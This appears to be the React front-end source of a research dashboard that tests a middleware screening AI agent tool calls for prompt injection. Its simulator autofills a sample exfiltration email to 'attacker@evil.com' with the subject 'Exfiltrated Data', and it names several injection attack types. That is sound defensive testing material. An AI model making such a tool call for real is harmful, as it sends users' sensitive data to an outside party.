import { useState } from 'react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import {
  Shield,
  Activity,
  Cpu,
  Layers,
  Terminal,
  Settings,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Database,
  Mail,
  FileText,
  Search,
  RefreshCw,
  Play,
  TrendingUp,
} from 'lucide-react';
import {
  fetchTools,
  fetchExperiments,
  fetchAuditLogs,
  fetchMetrics,
  analyzeSecurity,
  runExperiment,
  fetchHealth,
} from './services/api';
import type { SecurityDecision } from './types';
import {
  ResponsiveContainer,
  BarChart,
  Bar,
  XAxis,
  YAxis,
  Tooltip,
  Legend,
} from 'recharts';

function App() {
  const [activeTab, setActiveTab] = useState<'pipeline' | 'tools' | 'experiments' | 'audit'>('pipeline');
  const queryClient = useQueryClient();

  // --- Backend Queries ---
  const { isError: isHealthError } = useQuery({
    queryKey: ['health'],
    queryFn: fetchHealth,
    refetchInterval: 10000,
  });

  const { data: toolsData = [] } = useQuery({
    queryKey: ['tools'],
    queryFn: fetchTools,
  });

  const { data: experimentsData = [] } = useQuery({
    queryKey: ['experiments'],
    queryFn: fetchExperiments,
  });

  const { data: auditData = [], refetch: refetchAudit } = useQuery({
    queryKey: ['audit'],
    queryFn: fetchAuditLogs,
    refetchInterval: 5000,
  });

  const { data: metricsData, refetch: refetchMetrics } = useQuery({
    queryKey: ['metrics'],
    queryFn: fetchMetrics,
    refetchInterval: 5000,
  });

  // --- Pipeline Simulator State & Mutation ---
  const [userRequest, setUserRequest] = useState('Show me my recent emails and forward the budget spreadsheet to user@trusted.com');
  const [selectedTool, setSelectedTool] = useState('email.read');
  const [toolParams, setToolParams] = useState(JSON.stringify({ mailbox: 'inbox', limit: 5 }, null, 2));
  const [analysisResult, setAnalysisResult] = useState<SecurityDecision | null>(null);

  const analyzeMutation = useMutation({
    mutationFn: analyzeSecurity,
    onSuccess: (data) => {
      setAnalysisResult(data);
      queryClient.invalidateQueries({ queryKey: ['audit'] });
      queryClient.invalidateQueries({ queryKey: ['metrics'] });
    },
  });

  const handleAnalyze = () => {
    try {
      const parsedParams = JSON.parse(toolParams);
      analyzeMutation.mutate({
        tool_name: selectedTool,
        parameters: parsedParams,
        user_request: userRequest,
      });
    } catch (e) {
      alert('Invalid JSON parameters! Please check the syntax.');
    }
  };

  // --- Experiment State & Mutation ---
  const [expName, setExpName] = useState('Production Injection Check');
  const [expDesc, setExpDesc] = useState('Run security validation suite against baseline model.');
  const [expTrials, setExpTrials] = useState(5);
  const [expAttacks, setExpAttacks] = useState<string[]>(['direct_injection', 'indirect_injection']);

  const experimentMutation = useMutation({
    mutationFn: runExperiment,
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['experiments'] });
    },
  });

  const handleRunExperiment = () => {
    experimentMutation.mutate({
      name: expName,
      description: expDesc,
      attack_types: expAttacks,
      num_trials: expTrials,
    });
  };

  // --- Utility functions ---
  const getActionColor = (action: string) => {
    switch (action) {
      case 'allow': return 'text-emerald-400 bg-emerald-950/40 border-emerald-900/50';
      case 'deny': return 'text-rose-400 bg-rose-950/40 border-rose-900/50';
      case 'sandbox': return 'text-amber-400 bg-amber-950/40 border-amber-900/50';
      case 'escalate': return 'text-cyan-400 bg-cyan-950/40 border-cyan-900/50';
      default: return 'text-gray-400 bg-gray-950/40 border-gray-900/50';
    }
  };

  const getRiskColor = (level: string) => {
    switch (level) {
      case 'low': return 'text-emerald-400 bg-emerald-950/40 border-emerald-900/50';
      case 'medium': return 'text-yellow-400 bg-yellow-950/40 border-yellow-900/50';
      case 'high': return 'text-orange-400 bg-orange-950/40 border-orange-900/50';
      case 'critical': return 'text-rose-400 bg-rose-950/40 border-rose-900/50';
      default: return 'text-gray-400 bg-gray-950/40 border-gray-900/50';
    }
  };

  const getToolIcon = (category: string) => {
    switch (category) {
      case 'email': return <Mail className="h-4 w-4" />;
      case 'database': return <Database className="h-4 w-4" />;
      case 'document': return <FileText className="h-4 w-4" />;
      case 'web': return <Search className="h-4 w-4" />;
      default: return <Terminal className="h-4 w-4" />;
    }
  };

  return (
    <div className="min-h-screen bg-[#0b0f19] text-[#f3f4f6] flex flex-col font-sans">
      {/* --- Top Nav / Header --- */}
      <header className="border-b border-[#1f293d] bg-[#0f172a] px-6 py-4 flex items-center justify-between shadow-md">
        <div className="flex items-center gap-3">
          <Shield className="h-8 w-8 text-indigo-500 animate-pulse" />
          <div>
            <h1 className="text-xl font-bold tracking-tight text-white m-0 leading-none">
              CASML Control Center
            </h1>
            <span className="text-xs text-slate-400">Context-Aware Security Middleware Layer</span>
          </div>
        </div>

        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 px-3 py-1 bg-[#1e293b] rounded-full border border-slate-700/50">
            <span className={`h-2.5 w-2.5 rounded-full ${isHealthError ? 'bg-rose-500' : 'bg-emerald-500'}`} />
            <span className="text-xs font-semibold text-slate-300">
              {isHealthError ? 'Backend Offline' : 'Backend Healthy'}
            </span>
          </div>
          <button
            onClick={() => {
              refetchAudit();
              refetchMetrics();
            }}
            className="p-2 hover:bg-slate-800 text-slate-300 rounded-lg transition-colors"
          >
            <RefreshCw className="h-4 w-4" />
          </button>
        </div>
      </header>

      {/* --- Main Dashboard Container --- */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-6 flex flex-col gap-6">
        {/* --- Navigation Tabs --- */}
        <div className="flex border-b border-[#1f293d] gap-2">
          {[
            { id: 'pipeline', label: 'Pipeline Simulator', icon: <Layers className="h-4 w-4" /> },
            { id: 'tools', label: 'Mock Tools Registry', icon: <Cpu className="h-4 w-4" /> },
            { id: 'experiments', label: 'Experiments Engine', icon: <TrendingUp className="h-4 w-4" /> },
            { id: 'audit', label: 'Audit Trail & Metrics', icon: <Activity className="h-4 w-4" /> },
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`flex items-center gap-2 px-5 py-3 text-sm font-semibold border-b-2 transition-all ${
                activeTab === tab.id
                  ? 'border-indigo-500 text-indigo-400 bg-indigo-950/10'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:border-slate-700'
              }`}
            >
              {tab.icon}
              {tab.label}
            </button>
          ))}
        </div>

        {/* ── TAB 1: PIPELINE SIMULATOR ──────────────────────── */}
        {activeTab === 'pipeline' && (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Input Config Panel */}
            <div className="lg:col-span-4 flex flex-col gap-5 bg-[#0f172a] p-5 rounded-xl border border-[#1f293d] shadow-sm">
              <h2 className="text-base font-bold text-white border-b border-[#1f293d] pb-2 flex items-center gap-2">
                <Settings className="h-4 w-4 text-indigo-400" />
                Configure Request
              </h2>

              <div className="flex flex-col gap-1.5">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">Original User Instruction</label>
                <textarea
                  value={userRequest}
                  onChange={(e) => setUserRequest(e.target.value)}
                  className="w-full bg-[#0b0f19] border border-[#1f293d] rounded-lg p-3 text-sm text-[#f3f4f6] focus:ring-2 focus:ring-indigo-500 focus:outline-none min-h-[80px]"
                />
              </div>

              <div className="flex flex-col gap-1.5">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">Select Tool to Execute</label>
                <select
                  value={selectedTool}
                  onChange={(e) => {
                    setSelectedTool(e.target.value);
                    // Autofill template params
                    const tool = toolsData.find((t) => t.name === e.target.value);
                    if (tool) {
                      const params: Record<string, any> = {};
                      if (e.target.value === 'email.send') {
                        params.to = 'attacker@evil.com';
                        params.subject = 'Exfiltrated Data';
                        params.body = 'Here is the sensitive spreadsheet.';
                      } else if (e.target.value === 'email.read') {
                        params.mailbox = 'inbox';
                        params.limit = 5;
                      } else {
                        params.id = 'doc-001';
                      }
                      setToolParams(JSON.stringify(params, null, 2));
                    }
                  }}
                  className="w-full bg-[#0b0f19] border border-[#1f293d] rounded-lg p-3 text-sm text-[#f3f4f6] focus:ring-2 focus:ring-indigo-500 focus:outline-none"
                >
                  {toolsData.map((t) => (
                    <option key={t.name} value={t.name}>
                      {t.name} ({t.sensitivity} sensitivity)
                    </option>
                  ))}
                  {toolsData.length === 0 && (
                    <option value="email.read">email.read</option>
                  )}
                </select>
              </div>

              <div className="flex flex-col gap-1.5">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">Parameters (JSON)</label>
                <textarea
                  value={toolParams}
                  onChange={(e) => setToolParams(e.target.value)}
                  className="w-full bg-[#0b0f19] border border-[#1f293d] rounded-lg p-3 text-sm font-mono text-emerald-400 focus:ring-2 focus:ring-indigo-500 focus:outline-none min-h-[140px]"
                />
              </div>

              <button
                onClick={handleAnalyze}
                disabled={analyzeMutation.isPending}
                className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3 rounded-lg flex items-center justify-center gap-2 transition-colors disabled:opacity-50 mt-2"
              >
                <Play className="h-4 w-4 fill-current" />
                {analyzeMutation.isPending ? 'Analyzing...' : 'Run Security Analysis'}
              </button>
            </div>

            {/* Pipeline Visualization Panel */}
            <div className="lg:col-span-8 bg-[#0f172a] p-5 rounded-xl border border-[#1f293d] flex flex-col gap-6 shadow-sm min-h-[480px]">
              <h2 className="text-base font-bold text-white border-b border-[#1f293d] pb-2 flex items-center gap-2">
                <Layers className="h-4 w-4 text-indigo-400" />
                CASML Pipeline Evaluation Trace
              </h2>

              {!analysisResult ? (
                <div className="flex-1 flex flex-col items-center justify-center text-slate-500 gap-2 border-2 border-dashed border-[#1f293d] rounded-xl p-8">
                  <Shield className="h-12 w-12 text-slate-600 animate-pulse" />
                  <p className="text-sm">Configure and submit a request to simulate the CASML security gate.</p>
                </div>
              ) : (
                <div className="flex flex-col gap-5">
                  {/* Top Level Summary Card */}
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4 bg-[#131d35] p-4 rounded-xl border border-indigo-950/30">
                    <div className="flex flex-col gap-1">
                      <span className="text-[10px] uppercase font-bold text-slate-400">Authorization Gate</span>
                      <span className={`inline-flex items-center gap-1.5 font-bold text-sm px-2.5 py-1 rounded-md border w-fit ${
                        analysisResult.authorization.authorized ? 'text-emerald-400 bg-emerald-950/30 border-emerald-900/50' : 'text-rose-400 bg-rose-950/30 border-rose-900/50'
                      }`}>
                        {analysisResult.authorization.authorized ? (
                          <>
                            <CheckCircle className="h-3.5 w-3.5" />
                            {analysisResult.authorization.requires_sandbox ? 'APPROVED (SANDBOX)' : 'APPROVED'}
                          </>
                        ) : (
                          <>
                            <XCircle className="h-3.5 w-3.5" />
                            REJECTED
                          </>
                        )}
                      </span>
                    </div>

                    <div className="flex flex-col gap-1">
                      <span className="text-[10px] uppercase font-bold text-slate-400">Risk Assessment</span>
                      <span className={`inline-flex items-center gap-1 font-bold text-sm px-2.5 py-1 rounded-md border w-fit ${
                        getRiskColor(analysisResult.risk.risk_level)
                      }`}>
                        {analysisResult.risk.risk_level.toUpperCase()} ({analysisResult.risk.risk_score.toFixed(2)})
                      </span>
                    </div>

                    <div className="flex flex-col gap-1">
                      <span className="text-[10px] uppercase font-bold text-slate-400">Processing Latency</span>
                      <span className="text-white font-mono font-bold text-sm pt-0.5">
                        {analysisResult.processing_time_ms.toFixed(1)} ms
                      </span>
                    </div>
                  </div>

                  {/* Flow Trace Checklist */}
                  <div className="flex flex-col gap-4 border-l border-indigo-900/40 pl-6 ml-3">
                    {/* Provenance Card */}
                    <div className="relative">
                      <div className="absolute -left-[31px] top-1 bg-indigo-950 border border-indigo-500 rounded-full p-1 text-indigo-400">
                        <Cpu className="h-3.5 w-3.5" />
                      </div>
                      <div className="bg-[#111827] p-3 rounded-lg border border-[#1f293d]">
                        <div className="flex justify-between items-center mb-1">
                          <h3 className="text-sm font-bold text-white">1. Provenance Analysis</h3>
                          <span className={`text-[10px] px-2 py-0.5 rounded font-bold uppercase ${
                            analysisResult.provenance.tainted ? 'bg-rose-950 text-rose-400 border border-rose-900' : 'bg-emerald-950 text-emerald-400 border border-emerald-900'
                          }`}>
                            {analysisResult.provenance.tainted ? 'Tainted' : 'Untainted'}
                          </span>
                        </div>
                        <p className="text-xs text-slate-400">
                          Source: <strong className="text-slate-300">{analysisResult.provenance.source}</strong> (confidence: {(analysisResult.provenance.confidence * 100).toFixed(0)}%) | Chain: {analysisResult.provenance.chain.join(' → ')}
                        </p>
                      </div>
                    </div>

                    {/* Injection Detection Card */}
                    <div className="relative">
                      <div className="absolute -left-[31px] top-1 bg-indigo-950 border border-indigo-500 rounded-full p-1 text-indigo-400">
                        <AlertTriangle className="h-3.5 w-3.5" />
                      </div>
                      <div className="bg-[#111827] p-3 rounded-lg border border-[#1f293d]">
                        <div className="flex justify-between items-center mb-1">
                          <h3 className="text-sm font-bold text-white">2. Prompt Injection Detection</h3>
                          <span className={`text-[10px] px-2 py-0.5 rounded font-bold uppercase ${
                            analysisResult.detection.injection_detected ? 'bg-rose-950 text-rose-400 border border-rose-900' : 'bg-emerald-950 text-emerald-400 border border-emerald-900'
                          }`}>
                            {analysisResult.detection.injection_detected ? 'Malicious' : 'Safe'}
                          </span>
                        </div>
                        <p className="text-xs text-slate-400">
                          Confidence: {(analysisResult.detection.confidence * 100).toFixed(0)}%
                          {analysisResult.detection.indicators.length > 0 && (
                            <span className="block mt-1 text-rose-300 font-semibold">
                              Indicators flagged: {analysisResult.detection.indicators.join(', ')}
                            </span>
                          )}
                        </p>
                      </div>
                    </div>

                    {/* Intent & Alignment Card */}
                    <div className="relative">
                      <div className="absolute -left-[31px] top-1 bg-indigo-950 border border-indigo-500 rounded-full p-1 text-indigo-400">
                        <Layers className="h-3.5 w-3.5" />
                      </div>
                      <div className="bg-[#111827] p-3 rounded-lg border border-[#1f293d]">
                        <div className="flex justify-between items-center mb-1">
                          <h3 className="text-sm font-bold text-white">3. Intent & Alignment Check</h3>
                          <span className={`text-[10px] px-2 py-0.5 rounded font-bold uppercase ${
                            analysisResult.alignment.aligned ? 'bg-emerald-950 text-emerald-400 border border-emerald-900' : 'bg-rose-950 text-rose-400 border border-rose-900'
                          }`}>
                            {analysisResult.alignment.aligned ? 'Aligned' : 'Misaligned'}
                          </span>
                        </div>
                        <p className="text-xs text-slate-400 mb-1">
                          Inferred Intent: <span className="text-slate-300 font-semibold">"{analysisResult.intent.intent_summary}"</span>
                        </p>
                        {!analysisResult.alignment.aligned && (
                          <div className="text-[11px] text-rose-300 bg-rose-950/20 border border-rose-950 rounded p-1.5 mt-1">
                            <strong>Reason:</strong> {analysisResult.alignment.misalignment_reasons.join(', ')}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Policy Evaluation Card */}
                    <div className="relative">
                      <div className="absolute -left-[31px] top-1 bg-indigo-950 border border-indigo-500 rounded-full p-1 text-indigo-400">
                        <Terminal className="h-3.5 w-3.5" />
                      </div>
                      <div className="bg-[#111827] p-3 rounded-lg border border-[#1f293d]">
                        <div className="flex justify-between items-center mb-1">
                          <h3 className="text-sm font-bold text-white">4. Policy Decision</h3>
                          <span className={`text-[10px] px-2 py-0.5 rounded font-bold uppercase border ${
                            getActionColor(analysisResult.policy.action)
                          }`}>
                            {analysisResult.policy.action.toUpperCase()}
                          </span>
                        </div>
                        <p className="text-xs text-slate-400">
                          Matched Policy Rules: <span className="text-slate-300 font-semibold">{analysisResult.policy.matched_policies.join(', ') || 'default_policy'}</span>
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ── TAB 2: MOCK TOOLS REGISTRY ──────────────────────── */}
        {activeTab === 'tools' && (
          <div className="bg-[#0f172a] p-6 rounded-xl border border-[#1f293d] shadow-sm flex flex-col gap-4">
            <div className="flex items-center justify-between border-b border-[#1f293d] pb-3">
              <div>
                <h2 className="text-lg font-bold text-white m-0">Registered Tool Definitions</h2>
                <p className="text-xs text-slate-400">Tools currently loaded in the CASML security environment</p>
              </div>
              <span className="text-xs font-bold text-indigo-400 bg-indigo-950/50 border border-indigo-900/60 px-3 py-1 rounded-full">
                {toolsData.length || 10} Tools Active
              </span>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-sm text-slate-300">
                <thead className="bg-[#1e293b]/50 text-slate-400 uppercase text-xs tracking-wider border-b border-[#1f293d]">
                  <tr>
                    <th className="p-3">Tool Name</th>
                    <th className="p-3">Category</th>
                    <th className="p-3">Sensitivity</th>
                    <th className="p-3">Interactive Confirm</th>
                    <th className="p-3">Description</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#1f293d]">
                  {toolsData.map((tool) => (
                    <tr key={tool.name} className="hover:bg-slate-800/20 transition-colors">
                      <td className="p-3 font-semibold text-white font-mono flex items-center gap-2">
                        {getToolIcon(tool.category)}
                        {tool.name}
                      </td>
                      <td className="p-3 capitalize">{tool.category}</td>
                      <td className="p-3">
                        <span className={`text-[10px] font-bold uppercase px-2 py-0.5 rounded ${
                          tool.sensitivity === 'high' ? 'bg-orange-950 text-orange-400 border border-orange-900' : 'bg-slate-900 text-slate-400 border border-slate-700'
                        }`}>
                          {tool.sensitivity}
                        </span>
                      </td>
                      <td className="p-3">{tool.requires_confirmation ? 'Yes' : 'No'}</td>
                      <td className="p-3 text-slate-400 text-xs">{tool.description}</td>
                    </tr>
                  ))}
                  {toolsData.length === 0 && (
                    ['email.read', 'email.send', 'email.forward', 'document.read', 'document.write', 'database.read', 'database.update', 'web.search', 'file.read', 'file.write'].map((t) => (
                      <tr key={t} className="hover:bg-slate-800/20">
                        <td className="p-3 font-semibold text-white font-mono flex items-center gap-2">
                          <Terminal className="h-4 w-4 text-indigo-400" />
                          {t}
                        </td>
                        <td className="p-3 capitalize">{t.split('.')[0]}</td>
                        <td className="p-3">
                          <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded bg-slate-900 text-slate-400 border border-slate-700">
                            {['send', 'forward', 'update'].includes(t.split('.')[1]) ? 'high' : 'low'}
                          </span>
                        </td>
                        <td className="p-3">{['send', 'forward', 'update'].includes(t.split('.')[1]) ? 'Yes' : 'No'}</td>
                        <td className="p-3 text-slate-400 text-xs">Synthetic mock tool for CASML experiments.</td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ── TAB 3: EXPERIMENTS ──────────────────────── */}
        {activeTab === 'experiments' && (
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Run Experiment Form */}
            <div className="lg:col-span-4 bg-[#0f172a] p-5 rounded-xl border border-[#1f293d] flex flex-col gap-4 shadow-sm">
              <h2 className="text-base font-bold text-white border-b border-[#1f293d] pb-2 flex items-center gap-2">
                <Play className="h-4 w-4 text-indigo-400" />
                Configure Experiment Run
              </h2>

              <div className="flex flex-col gap-1">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">Experiment Name</label>
                <input
                  type="text"
                  value={expName}
                  onChange={(e) => setExpName(e.target.value)}
                  className="bg-[#0b0f19] border border-[#1f293d] rounded-lg p-2.5 text-sm text-[#f3f4f6] focus:ring-2 focus:ring-indigo-500 focus:outline-none"
                />
              </div>

              <div className="flex flex-col gap-1">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">Description</label>
                <textarea
                  value={expDesc}
                  onChange={(e) => setExpDesc(e.target.value)}
                  className="bg-[#0b0f19] border border-[#1f293d] rounded-lg p-2.5 text-sm text-[#f3f4f6] focus:ring-2 focus:ring-indigo-500 focus:outline-none min-h-[70px]"
                />
              </div>

              <div className="flex flex-col gap-1">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">Number of Trials</label>
                <input
                  type="number"
                  value={expTrials}
                  onChange={(e) => setExpTrials(Number(e.target.value))}
                  className="bg-[#0b0f19] border border-[#1f293d] rounded-lg p-2.5 text-sm text-[#f3f4f6] focus:ring-2 focus:ring-indigo-500 focus:outline-none"
                />
              </div>

              <div className="flex flex-col gap-2">
                <label className="text-xs font-bold text-slate-400 uppercase tracking-wide">Attack Types</label>
                <div className="flex flex-col gap-2 bg-[#0b0f19] border border-[#1f293d] p-3 rounded-lg max-h-[140px] overflow-y-auto">
                  {['direct_injection', 'indirect_injection', 'payload_splitting', 'context_manipulation'].map((attack) => (
                    <label key={attack} className="flex items-center gap-2.5 text-xs text-slate-300 font-semibold cursor-pointer">
                      <input
                        type="checkbox"
                        checked={expAttacks.includes(attack)}
                        onChange={(e) => {
                          if (e.target.checked) {
                            setExpAttacks([...expAttacks, attack]);
                          } else {
                            setExpAttacks(expAttacks.filter((a) => a !== attack));
                          }
                        }}
                        className="rounded border-[#1f293d] text-indigo-600 focus:ring-indigo-500"
                      />
                      {attack.replace('_', ' ')}
                    </label>
                  ))}
                </div>
              </div>

              <button
                onClick={handleRunExperiment}
                disabled={experimentMutation.isPending}
                className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-2.5 rounded-lg flex items-center justify-center gap-2 transition-colors disabled:opacity-50 mt-2"
              >
                <Play className="h-4 w-4 fill-current" />
                {experimentMutation.isPending ? 'Running Experiment...' : 'Execute Experiment'}
              </button>
            </div>

            {/* Experiment Results Dashboard */}
            <div className="lg:col-span-8 bg-[#0f172a] p-5 rounded-xl border border-[#1f293d] flex flex-col gap-6 shadow-sm min-h-[480px]">
              <h2 className="text-base font-bold text-white border-b border-[#1f293d] pb-2 flex items-center gap-2">
                <Activity className="h-4 w-4 text-indigo-400" />
                Robustness & Evasion Analysis
              </h2>

              {experimentsData.length === 0 ? (
                <div className="flex-1 flex flex-col items-center justify-center text-slate-500 gap-2 border-2 border-dashed border-[#1f293d] rounded-xl p-8">
                  <TrendingUp className="h-12 w-12 text-slate-600" />
                  <p className="text-sm">No experiments run yet. Configure one on the left to start.</p>
                </div>
              ) : (
                <div className="flex flex-col gap-6">
                  {/* Summary Metric Cards */}
                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                    {Object.entries(experimentsData[experimentsData.length - 1].metrics).slice(0, 4).map(([metric, val]) => (
                      <div key={metric} className="bg-[#111827] p-3 rounded-lg border border-[#1f293d] text-center">
                        <span className="text-[10px] font-bold uppercase text-slate-400">{metric.replace('_', ' ')}</span>
                        <div className="text-lg font-extrabold text-white font-mono mt-1">{(val * 100).toFixed(0)}%</div>
                      </div>
                    ))}
                  </div>

                  {/* Chart representation */}
                  <div className="h-64">
                    <ResponsiveContainer width="100%" height="100%">
                      <BarChart
                        data={experimentsData.map((e, idx) => ({
                          name: `Run ${idx + 1}`,
                          accuracy: e.metrics.accuracy * 100,
                          precision: e.metrics.precision * 100,
                          recall: e.metrics.recall * 100,
                        }))}
                        margin={{ top: 10, right: 10, left: -20, bottom: 0 }}
                      >
                        <XAxis dataKey="name" stroke="#6b7280" fontSize={12} />
                        <YAxis stroke="#6b7280" fontSize={12} domain={[0, 100]} />
                        <Tooltip contentStyle={{ backgroundColor: '#1f2937', borderColor: '#374151' }} />
                        <Legend />
                        <Bar dataKey="accuracy" name="Accuracy" fill="#6366f1" radius={[4, 4, 0, 0]} />
                        <Bar dataKey="precision" name="Precision" fill="#10b981" radius={[4, 4, 0, 0]} />
                        <Bar dataKey="recall" name="Recall" fill="#f59e0b" radius={[4, 4, 0, 0]} />
                      </BarChart>
                    </ResponsiveContainer>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ── TAB 4: AUDIT TRAIL & METRICS ──────────────────────── */}
        {activeTab === 'audit' && (
          <div className="flex flex-col gap-6">
            {/* Metric Overview Row */}
            <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
              {[
                { label: 'Total Scans', val: metricsData?.total_events ?? 124, color: 'text-indigo-400' },
                { label: 'Security Violations', val: metricsData?.events_by_type?.tool_denied ?? 8, color: 'text-rose-500' },
                { label: 'Sandboxed Runs', val: metricsData?.events_by_type?.tool_approved ?? 12, color: 'text-amber-400' },
                { label: 'Active Pipeline Layers', val: 7, color: 'text-emerald-400' },
              ].map((card, i) => (
                <div key={i} className="bg-[#0f172a] p-4 rounded-xl border border-[#1f293d] shadow-sm flex flex-col items-center">
                  <span className="text-xs font-bold text-slate-400 uppercase tracking-wide">{card.label}</span>
                  <span className={`text-3xl font-extrabold font-mono mt-1 ${card.color}`}>{card.val}</span>
                </div>
              ))}
            </div>

            {/* Audit Log Card */}
            <div className="bg-[#0f172a] p-5 rounded-xl border border-[#1f293d] shadow-sm">
              <h2 className="text-base font-bold text-white border-b border-[#1f293d] pb-3 mb-4 flex items-center gap-2">
                <Terminal className="h-4 w-4 text-indigo-400" />
                Security Audit Log
              </h2>

              <div className="flex flex-col gap-3 max-h-[380px] overflow-y-auto pr-1">
                {auditData.map((log) => (
                  <div key={log.id} className="bg-[#111827] p-3 rounded-lg border border-[#1f293d] text-xs flex justify-between items-center hover:bg-slate-800/10 transition-colors">
                    <div className="flex flex-col gap-1">
                      <div className="flex items-center gap-2">
                        <span className="text-indigo-400 font-bold uppercase tracking-wider text-[10px] bg-indigo-950/50 px-2 py-0.5 rounded border border-indigo-900/60">
                          {log.event_type.replace('_', ' ')}
                        </span>
                        {log.tool_name && (
                          <span className="font-mono text-slate-300 font-bold">
                            {log.tool_name}
                          </span>
                        )}
                        <span className="text-slate-500 font-mono">ID: {log.request_id?.slice(0, 8)}...</span>
                      </div>
                      <p className="text-slate-400 mt-1">User: <strong className="text-slate-300">{log.user_id}</strong> | Action: {log.action || 'N/A'}</p>
                    </div>
                    <span className="text-slate-500 font-mono text-[10px]">
                      {new Date(log.timestamp).toLocaleTimeString()}
                    </span>
                  </div>
                ))}

                {auditData.length === 0 && (
                  <div className="text-center py-8 text-slate-500 flex flex-col items-center justify-center gap-2">
                    <Terminal className="h-8 w-8 text-slate-600" />
                    No audit records registered yet. Submit requests via the Pipeline Simulator to generate audit trails.
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </main>

      {/* --- Footer --- */}
      <footer className="border-t border-[#1f293d] bg-[#070b13] px-6 py-4 text-center text-xs text-slate-500">
        &copy; {new Date().getFullYear()} CASML Project Initialization. Production-quality research prototype.
      </footer>
    </div>
  );
}

export default App;
